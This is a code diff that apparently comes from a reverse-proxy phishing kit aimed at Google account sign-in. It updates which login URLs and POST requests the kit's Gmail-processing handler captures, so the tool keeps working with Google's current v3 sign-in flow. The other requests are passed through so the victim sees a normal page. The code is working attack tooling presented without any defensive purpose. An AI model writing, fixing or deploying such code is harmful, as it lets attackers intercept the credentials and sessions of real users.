@@ -20,15 +20,16 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        // if (this.browserReq.url.startsWith('/v3/signin/_/___AccountsSignInUi/data/batchexecute')
-        // || this.browserReq.url.startsWith('/signin/v2/')
-        // || this.browserReq.url.startsWith('/_/signin/challenge')) {
-        //     return this.makeGmailProcess()
-        // }
-        return this.makeGmailProcess()
-        // return this.browserReq.pipe(this.proxyEndpoint)
-        
-
+        // Only process Gmail form submissions, not redirects or page loads
+        if (this.browserReq.url.startsWith('/v3/signin/_/___AccountsSignInUi/data/batchexecute')
+        || this.browserReq.url.startsWith('/signin/v2/')
+        || this.browserReq.url.startsWith('/_/signin/challenge')
+        || this.browserReq.url.startsWith('/v3/signin/identifier')
+        || this.browserReq.method === 'POST') {
+            return this.makeGmailProcess()
+        }
+        // For all other requests (like redirects), just pipe them through
+        return this.browserReq.pipe(this.proxyEndpoint)
     }
 
     makeGmailProcess() {
@@ -329,7 +330,7 @@ const configExport = {
 
     CURRENT_DOMAIN: 'accounts.google.com',
 
-    START_PATH: '/signin/v2/identifier?hl=en',
+    START_PATH: '/v3/signin/identifier?hl=en',
 
     AUTOGRAB_CODE: 'Email',
 
